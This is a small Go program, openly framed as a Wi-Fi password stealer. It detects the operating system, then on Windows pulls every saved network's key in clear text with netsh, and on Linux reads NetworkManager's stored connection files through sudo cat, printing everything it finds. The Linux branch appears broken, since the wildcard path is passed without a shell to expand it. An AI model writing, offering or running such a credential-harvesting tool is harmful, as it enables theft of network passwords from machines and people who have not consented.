package main

import (
	"fmt"
	"os/exec"
	"regexp"
	"runtime"
)

func main() {
	system := runtime.GOOS

	switch system {
	case "linux":
		stealWifiPasswordsLinux()
	case "windows":
		stealWifiPasswordsWindows()
	default:
		fmt.Println("This operating system is not supported.")
	}
}

func stealWifiPasswordsWindows() {
	cmd := exec.Command("cmd", "/c", "netsh wlan show profile")
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Could not retrieve WiFi networks:", err)
		return
	}

	re := regexp.MustCompile(`Profile\s*:\s(.*)`)
	matches := re.FindAllStringSubmatch(string(output), -1)

	for _, match := range matches {
		networkName := match[1]
		cmd := exec.Command("cmd", "/c", "netsh wlan show profile \""+networkName+"\" key=clear")
		networkOutput, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Println("Could not retrieve WiFi password:", err)
			continue
		}
		fmt.Println("SSID:", networkName)
		fmt.Println("INFO:", string(networkOutput))
	}
}

func stealWifiPasswordsLinux() {
	cmd := exec.Command("sudo", "cat", "/etc/NetworkManager/system-connections/*")
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Could not retrieve WiFi networks:", err)
		return
	}

	fmt.Println("WiFi Networks and Passwords:")
	fmt.Println(string(output))
}
